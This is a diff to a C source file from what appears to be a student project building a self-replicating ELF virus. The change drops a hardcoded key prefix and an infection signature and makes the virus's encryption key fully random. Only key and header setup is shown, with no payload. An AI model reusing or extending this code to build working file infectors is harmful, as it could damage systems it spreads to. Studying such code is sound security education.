@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/12 13:49:53 by spolowy          ###   ########.fr       */
+/*   Updated: 2019/06/15 17:04:28 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -57,12 +57,6 @@
 ** Note that relative_virus_addresss is in the opposite direction !
 */
 
-# define CALL_INSTR_SIZE	5 /* sizeof "call mark_below" -> e8 2000 0000 */
-# define SECRET_KEY		(char[10]){'4','2','R','e','m','b','l','a','i','\0'}
-# define SECRET_LEN		10
-# define SIGNATURE		(char[6]){'s','o','u','r','i','s'}
-# define SIGNATURE_LEN		6
-
 static void	generate_key(char *buffer, size_t len)
 {
 	ft_getrandom(buffer, len);
@@ -71,9 +65,7 @@ static void	generate_key(char *buffer, size_t len)
 static void	init_constants(struct client_info *constants, \
 			const struct entry *clone_entry)
 {
-	ft_memcpy(constants->signature, SIGNATURE, SIGNATURE_LEN);
-	ft_memcpy(constants->key, SECRET_KEY, SECRET_LEN);
-	generate_key((char *)constants->key + SECRET_LEN, 16 - SECRET_LEN);
+	generate_key((char *)constants->key, 16);
 
 	const size_t		end_of_last_section = clone_entry->end_of_last_section;
 	const Elf64_Off		p_offset  = (clone_entry->safe_phdr->p_offset);
